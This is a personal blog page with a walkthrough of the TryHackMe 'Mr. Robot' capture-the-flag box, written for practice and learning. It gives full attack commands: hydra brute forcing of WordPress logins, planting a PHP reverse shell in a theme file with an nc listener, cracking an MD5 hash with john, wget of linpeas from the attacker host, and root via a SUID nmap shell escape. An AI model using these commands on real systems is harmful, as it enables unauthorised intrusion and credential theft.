@@ -1,0 +1,139 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta http-equiv=content-language content="en">
+<meta name=color-scheme content="light dark">
+<meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;">
+<meta name=author content="Kiel Vaughn">
+<meta name=description content="Below are the steps to get the 3 flags on the Mr. Robot box on TryHackMe.
+First, let&rsquo;s run nmap with nmap -sC -sV -O -T4 [machine ip]. This will return ssh which is marked as closed, and both ports 80 and 443 which are open.
+Launching both sites leads to the same terminal window which seems to have some of the propaganda from fsociety. Let&rsquo;s use gobuster to enumerate the webserver with gobuster dir -u http://[machine ip] -w /usr/share/wordlists/dirbuster/directory-list-2.">
+<meta name=keywords content="blog,cybersecurity,personal">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content=" Mr. Robot - TryHackMe">
+<meta name=twitter:description content="Below are the steps to get the 3 flags on the Mr. Robot box on TryHackMe.
+First, let&rsquo;s run nmap with nmap -sC -sV -O -T4 [machine ip]. This will return ssh which is marked as closed, and both ports 80 and 443 which are open.
+Launching both sites leads to the same terminal window which seems to have some of the propaganda from fsociety. Let&rsquo;s use gobuster to enumerate the webserver with gobuster dir -u http://[machine ip] -w /usr/share/wordlists/dirbuster/directory-list-2.">
+<meta property="og:title" content=" Mr. Robot - TryHackMe">
+<meta property="og:description" content="Below are the steps to get the 3 flags on the Mr. Robot box on TryHackMe.
+First, let&rsquo;s run nmap with nmap -sC -sV -O -T4 [machine ip]. This will return ssh which is marked as closed, and both ports 80 and 443 which are open.
+Launching both sites leads to the same terminal window which seems to have some of the propaganda from fsociety. Let&rsquo;s use gobuster to enumerate the webserver with gobuster dir -u http://[machine ip] -w /usr/share/wordlists/dirbuster/directory-list-2.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="http://www.kielvaughn.com/ctfs/2020-07-12-mr.-robot/"><meta property="article:section" content="ctfs">
+<meta property="article:published_time" content="2020-07-12T00:00:00+00:00">
+<meta property="article:modified_time" content="2020-07-12T00:00:00+00:00">
+<title>
+Mr. Robot - TryHackMe · Kiel Vaughn, CISSP
+</title>
+<link rel=canonical href=http://www.kielvaughn.com/ctfs/2020-07-12-mr.-robot/>
+<link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin>
+<link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen>
+<link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen>
+<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32>
+<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16>
+<link rel=apple-touch-icon href=/assets/img/cissp.ico>
+<link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico>
+<meta name=generator content="Hugo 0.88.1">
+</head>
+<body class="preload-transitions colorscheme-dark">
+<main class=wrapper>
+<nav class=navigation>
+<section class=container>
+<a class=navigation-title href=/>
+Kiel Vaughn, CISSP
+</a>
+<input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle>
+<i class="fa fa-bars fa-fw" aria-hidden=true></i>
+</label>
+<ul class=navigation-list>
+<li class=navigation-item>
+<a class=navigation-link href=/whoami/>whoami</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/certifications/>certifications</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/posts/>blog</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a>
+</li>
+</ul>
+</section>
+</nav>
+<div class=content>
+<section class="container page">
+<article>
+<header>
+<h1 class=title>
+<a class=title-link href=http://www.kielvaughn.com/ctfs/2020-07-12-mr.-robot/>
+Mr. Robot - TryHackMe
+</a>
+</h1>
+</header>
+<p>Below are the steps to get the 3 flags on the Mr. Robot box on <a href=https://www.tryhackme.com>TryHackMe</a>.</p>
+<p>First, let&rsquo;s run nmap with <strong>nmap -sC -sV -O -T4 [machine ip]</strong>. This will return ssh which is marked as closed, and both ports 80 and 443 which are open.</p>
+<p><img src=/assets/img/MrRobot1.png alt="Mr. Robot 1"></p>
+<p>Launching both sites leads to the same terminal window which seems to have some of the propaganda from fsociety. Let&rsquo;s use gobuster to enumerate the webserver with <strong>gobuster dir -u http://[machine ip] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</strong>.</p>
+<p>After a bit, several interesting results come up as shown below.</p>
+<p><img src=/assets/img/MrRobot2.png alt="Mr. Robot 2"></p>
+<p>The hint for the first question also mentions <strong>robots</strong>, so let&rsquo;s look at <strong>http://[machine ip]/robots.txt</strong>. This leads to the following:</p>
+<p><img src=/assets/img/MrRobot3.png alt="Mr. Robot 3"></p>
+<p>Let&rsquo;s visit key-1-of-3.txt by going to <strong>http://[machine ip]/key-1-of-3.txt</strong>. This is where you will find the first key to this challenge.</p>
+<p><img src=/assets/img/MrRobot4.png alt="Mr. Robot 3 key1"></p>
+<p>Next, let&rsquo;s go to <strong>http://[machine ip]/fsocity.dic</strong>. This is a dictionary file with a huge list of words that may prove useful later on. The other useful thing we found was that this appears to be a WordPress site, so let&rsquo;s go to <strong>http://[machine ip]/wp-login</strong>. This brings you to a WordPress login page as expected.</p>
+<p><img src=/assets/img/MrRobot5.png alt="Mr. Robot 5"></p>
+<p>WordPress contains a pretty poor security practice where it will tell you if a username does not exist. For example, I attempted with the user admin, and received this error message.</p>
+<p><img src=/assets/img/MrRobot6.png alt="Mr. Robot 6"></p>
+<p>In a real world scenario, you would probably create a list of users with cewl based off of the website or use some other dictionary file, but in this case, I guessed a few characters from the television series, which led to <strong>Elliot</strong> being uncovered as the login name.</p>
+<p><img src=/assets/img/MrRobot7.png alt="Mr. Robot 7"></p>
+<p>Now that we had a username to login with, let&rsquo;s use hydra to brute force the password. The fsocity.dic file we saved earlier should be a good place to start, however, it has over 800,000 records in it. I assumed there were some duplicates, so I used sort and uniq to make it a more manageable list with. The command to run is <strong>sort fsocity.dic|uniq > UniquePasswords.txt</strong>. This reduced the list down to around 11,000 unique entries and saved it to UniquePasswords.txt, which will run much quicker when brute forcing passwords.</p>
+<p><img src=/assets/img/MrRobot8.png alt="Mr. Robot 8"></p>
+<p>The command to brute force in hydra is <strong>hydra -l Elliot -P ~/Downloads/UniquePasswords.txt [machine ip] -V http-form-post &lsquo;/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location&rsquo;</strong>. This will return Elliot&rsquo;s password.</p>
+<p><img src=/assets/img/MrRobot9.png alt="Mr. Robot 9"></p>
+<p>Now that we have Elliot&rsquo;s password, let&rsquo;s login to the WordPress site. Once here, let&rsquo;s upload a reverse PHP shell. The one I recommend using is from <a href=http://pentestmonkey.net/tools/web-shells/php-reverse-shell>PentestMonkey</a>. Adjust the IP/Port to reflect your attacker machine&rsquo;s IP and the port you wish to connect with and save the shell. Next, let&rsquo;s click on <strong>Appearance</strong> followed by <strong>Editor</strong> on the left hand side. Choose one of the existing php files (I used <strong>404.php</strong>) to view it&rsquo;s contents, delete the contents of this file, and paste the reverse shell into that file.</p>
+<p><img src=/assets/img/MrRobot10.png alt="Mr. Robot 10"></p>
+<p>When done, click on <strong>Update File</strong> at the bottom of the file to save it.</p>
+<p><img src=/assets/img/MrRobot11.png alt="Mr. Robot 11"></p>
+<p>On your attacker pc, run <strong>nc -nvlp [port number]</strong> where port number is the one selected in the php reverse shell earlier. Now, try to navigate to a random page to trigger a 404 error, which should launch the reverse shell.</p>
+<p><img src=/assets/img/MrRobot12.png alt></p>
+<p><img src=/assets/img/MrRobot13.png alt="Mr. Robot 13"></p>
+<p>We now have a reverse shell. <strong>whoami</strong> reveals we are running as user <strong>daemon</strong> in the root directory. Let&rsquo;s navigate to home with <strong>cd home</strong> and run <strong>ls</strong> to view it&rsquo;s contents. There is a <strong>robot</strong> user folder here. Let&rsquo;s run <strong>cd robot</strong> followed by <strong>ls</strong> and we will see <strong>key-2-of-3.txt</strong> and <strong>password.raw-md5</strong>. <strong>cat key-2-of-3.txt</strong> will give you the 2nd key to this challenge, but we are not able to access it as daemon.</p>
+<p><img src=/assets/img/MrRobot14.png alt="Mr. Robot 14"></p>
+<p>Let&rsquo;s <strong>cat</strong> <strong>password.raw-md5</strong> and we will see that we have the hash for robot.</p>
+<p><img src=/assets/img/MrRobot15.png alt="Mr. Robot 15"></p>
+<p>Let&rsquo;s copy and save this so we can crack it with john. Once you saved this locally (I saved it to a file called <strong>robothash.txt</strong>), run the following command: <strong>john robothash.txt &ndash;format=&ldquo;Raw-MD5&rdquo; -wordlist=/usr/share/wordlists/rockyou.txt</strong>. Within a few moments you will crack this password. Raw-MD5 was selected as the format based on the extension in the file the hash came from (password.raw-md5).</p>
+<p><img src=/assets/img/MrRobot16.png alt="Mr. Robot 16"></p>
+<p>Since ssh is blocked, let&rsquo;s try to run <strong>su robot</strong> to swap from daemon to the robot user . We aren&rsquo;t able to because we&rsquo;re not running a TTY terminal.</p>
+<p><img src=/assets/img/MrRobot17.png alt="Mr. Robot 17"></p>
+<p>Let&rsquo;s run <strong>python -c &lsquo;import pty; pty.spawn("/bin/sh")'</strong> to upgrade our shell and run <strong>su robot</strong> again. Now we are able to swap over to robot with the password we uncovered with john.</p>
+<p><img src=/assets/img/MrRobot18.png alt="Mr. Robot 18"></p>
+<p>Let&rsquo;s run <strong>cat key-2-of-3.txt</strong> and we are able to uncover this flag.</p>
+<p><img src=/assets/img/MrRobot19.png alt="Mr. Robot 19"></p>
+<p>At this point, we need to enumerate to figure out how we are going to escalate privileges to root. On our attacker machine, lets serve up a python server with <strong>python3 -m http.server</strong>. Next, on our victim machine, run <strong>cd /tmp</strong> followed by <strong>wget http://[your attacker ip]:8000/linpeas.sh</strong> to download linpeas to the tmp directory of our victim. Next, run <strong>chmod 777 linpeas.sh</strong> to make it executable.</p>
+<p><img src=/assets/img/MrRobot20.png alt="Mr. Robot 20"></p>
+<p>Next, run <strong>./linpeas.sh</strong> to start enumerating the host. Partially through the script there is a list of SUID programs, and <strong>nmap</strong> stands out.</p>
+<p><img src=/assets/img/MrRobot21.png alt="Mr. Robot 21"></p>
+<p>Let&rsquo;s navigate to that folder with <strong>cd /usr/local/bin</strong> and run <strong>nmap &ndash;help</strong>. This is an older version of nmap (3.81), and it has an interactive mode that can be ran with the &ndash;interactive flag.</p>
+<p><img src=/assets/img/MrRobot22.png alt="Mr. Robot 22"></p>
+<p>Let&rsquo;s run <strong>nmap &ndash;interactive</strong>. This is an old version of nmap, and this can be utilized to get a root shell since it is running as root due to the SUID flag. The command to run once in interactive mode is <strong>!sh</strong></p>
+<p><img src=/assets/img/MrRobot23.png alt="Mr. Robot 23"></p>
+<p>Let&rsquo;s run <strong>cd /root</strong> followed by <strong>ls</strong>. You will see the 3rd key file there. Run <strong>cat key-3-of-3.txt</strong> to get the final key!</p>
+<p><img src=/assets/img/MrRobot24.png alt="Mr. Robot 24"></p>
+</article>
+</section>
+</div>
+<footer class=footer>
+<section class=container>
+©
+2020 -
+2021
+Kiel Vaughn
+</section>
+</footer>
+</main>
+<script src=/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js integrity="sha256-A7F3afT5GuNWZ+HyocqMFvUFYlds+Q/zKzF5kmkU2qU="></script>
+</body>
+</html>
